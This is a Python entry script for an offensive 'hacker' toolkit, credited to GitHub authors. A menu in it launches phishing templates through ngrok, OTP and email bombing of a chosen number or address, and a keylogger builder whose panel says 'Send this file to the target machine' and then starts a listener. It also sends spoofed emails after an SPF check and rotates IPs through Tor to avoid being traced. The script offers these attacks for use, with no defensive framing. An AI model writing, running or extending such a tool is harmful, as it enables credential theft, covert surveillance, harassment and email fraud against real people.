"""
Original Author    : https://github.com/karthi-the-hacker
GitHub             : https://github.com/minefarts
"""

import sys
from includes import banner
from includes import utils
from includes.menu import main_menu
from includes import config_status
from AttackModes import phishing
from AttackModes import keylogger
from AttackModes import spfattack
from AttackModes import otpboming
from AttackModes import emailboming
from AttackModes import ipchanger 
from rich.console import Console
from rich.panel import Panel
import os


from colorama import Fore, Style, init
init(autoreset=True)

console = Console()




def main():
    utils.check_sudo()
    while True:
        
        banner.show_banner()
        choice = main_menu()

        if choice == 1:
            utils.kill_port(80)
            banner.show_banner()
            config_status.check_ngrok()
            selected_template = utils.choose_template()
            if selected_template:
                phishing.pish(selected_template)

                

            else:
                print("🔙 Returning to main menu...")
        elif choice == 2:
            banner.clear
            banner.show_banner()
            
            result = otpboming.getio()
            if result:
                country_code, mobile_no, otpcount = result
                banner.clear
                banner.show_banner()
                otpboming.sendotp(country_code, mobile_no, otpcount)
            else:
                print("🔙 Returning to main menu...")

        elif choice == 3:
             banner.clear
             banner.show_banner()
             selected = keylogger.user_option()
             if selected == '1':
                banner.clear
                banner.show_banner()
                result =keylogger.getio()
                if result:
                    os_type = result
                    apppath = keylogger.compile_app(os_type)
                    if apppath:
                        banner.clear
                        banner.show_banner()
                        appname = os.path.basename(apppath)
                        console.print(Panel.fit(
                        f"[bold green]✅ Keylogger compiled successfully![/bold green]\n\n"
                        f"👉 Output File: {apppath}\n"
                        f"📤 Send this file to the target machine.\n"
                        f"💻 Run it using: ./[bold yellow]{appname}[/bold yellow] <your IP>\n",
                        border_style="magenta"
                    ))
                        input("🔙 Press Enter to start listner ...")
                        banner.clear
                        banner.show_banner()
                        keylogger.start_keylogger_server()
                    
                else:
                    print("❌ User exited.")
             elif selected == '2':
                keylogger.start_keylogger_server()
             elif selected == 'x':
                print("Exiting...")
             
        elif choice == 4:
            banner.clear
            banner.show_banner()
            result = emailboming.getio()
            if result:
                emailid, otpcount = result
                banner.clear
                banner.show_banner()
                emailboming.sendotp(emailid, otpcount)
            else:
                print("🔙 Returning to main menu...")
        
        elif choice == 5:
            banner.clear
            banner.show_banner()
            result = spfattack.getio()
            if result:
                emailid = result
                banner.clear
                banner.show_banner()
                spf = spfattack.check_spf(emailid)
                print(spf)
                if spf and spf == "Vulnerable to spoofing":
                    console.print(Panel.fit(
                        f"[bold green]✅ SPF Check Completed![/bold green]\n\n"
                        f"👉 Email ID: {emailid}\n"
                        f"👉 Status: {spf}\n"
                        f"👉 Enter to Address to send Fake email: \n",
                        border_style="magenta"
                    ))
                    to_email = spfattack.get_emailidto()
                    if to_email == "exit":
                        print("🔙 Returning to main menu...")
                        continue
                    subject = input("📧 Enter Subject: ").strip() 
                    msg = input("📧 Enter Message to send: ").strip()    
                    status = spfattack.send_spoofed_email(emailid, to_email, subject, msg) 
                    message = status.get("message")
                    if status and message == "Email sent successfully":
                        banner.clear
                        
                        banner.show_banner()
                        console.print(Panel.fit(
                            f"[bold green]✅ Email sent successfully![/bold green]\n\n"
                            f"👉 From: {emailid}\n"
                            f"👉 To: {to_email}\n"
                            f"👉 Subject: {subject}\n"
                            f"👉 Message: {msg}\n",
                            border_style="magenta"
                        ))
                        input("🔙 Press Enter to return to the main menu...")
                    else :
                        console.print(f"[bold red]❌ {message}.[/bold red]")
                        input("🔙 Press Enter to return to the main menu...")
                   
                else:
                    console.print("[bold red]❌ Failed to check SPF record or Not Vulnerable.[/bold red]")
                    input("🔙 Returning to main menu...")
            else:
                print("🔙 Returning to main menu...")
        elif choice == 6:
            banner.clear
            status = ipchanger.start_tor_service()
            if status == True:
                banner.show_banner()
                banner.ipc_banner()
                banner.ipchanger_instructions()
                sec = ipchanger.get_sec()              
                if isinstance(sec, int):
                    ipchanger.start(sec)
                elif sec == "exit":
                    print("🔙 Returning to main menu...")
            

        elif choice == 0:
            banner.bye()
            sys.exit(0)
            
        else:
            banner.not_implemented()

if __name__ == "__main__":
    main()
